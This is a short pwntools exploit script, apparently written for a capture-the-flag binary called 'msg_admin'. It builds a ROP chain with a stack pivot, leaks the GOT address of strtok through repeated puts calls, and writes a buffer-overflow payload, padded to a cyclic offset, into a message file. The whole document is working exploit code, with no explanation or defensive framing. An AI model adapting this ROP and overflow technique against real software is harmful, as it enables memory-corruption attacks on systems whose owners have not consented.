from pwn import *

elf = ELF('msg_admin')
rop = ROP(elf)

pivot = rop.search(move=20).address # Need to move the stack 16 bytes
strtok = elf.got['strtok']

log.info("Pivot: {}".format(hex(pivot)))
log.info("Strtok: {}".format(hex(strtok)))

rop.puts(strtok)
rop.puts(strtok)
rop.puts(strtok)
rop.puts(strtok)

print rop.dump()

with open('pwn.msg', 'w') as f:
    sc = str(rop)
    sc += 'A' * (cyclic_find('daac')-len(sc)) + p32(strtok)
    sc += 'B' * (216 - len(sc))
    f.write('{}|{}\n'.format('a'*4, sc))
    f.write('{}|{}\n'.format(p32(pivot), 'B'*12))
    f.write('{}|{}\n'.format('c'*4, 'C'*12))

